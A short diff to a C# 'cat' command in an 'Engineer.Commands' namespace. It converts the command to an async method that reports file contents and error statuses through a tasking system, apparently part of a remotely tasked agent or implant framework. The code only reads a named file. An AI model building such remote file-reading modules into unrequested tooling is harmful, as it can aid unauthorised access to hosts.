@@ -5,6 +5,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -12,7 +13,7 @@ namespace Engineer.Commands
     {
         public override string Name => "cat";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try
             {
@@ -22,16 +23,17 @@ namespace Engineer.Commands
                     string content = File.ReadAllText(file);
                     if (content.Length == 0)
                     {
-                        return "file does not exist or has no content";
+                        Tasking.FillTaskResults("file does not exist or has no content", task, EngTaskStatus.CompleteWithErrors);
+                        return;
                     }
 
-                    return content;
+                    Tasking.FillTaskResults(content,task,EngTaskStatus.Complete);
                 }
-                return "Failed to read file content";
+                Tasking.FillTaskResults("no /file argument given",task,EngTaskStatus.FailedWithWarnings);
             }
             catch (Exception ex)
             {
-                return "error: "+ex.Message;
+                Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed);
             }
         }
     }
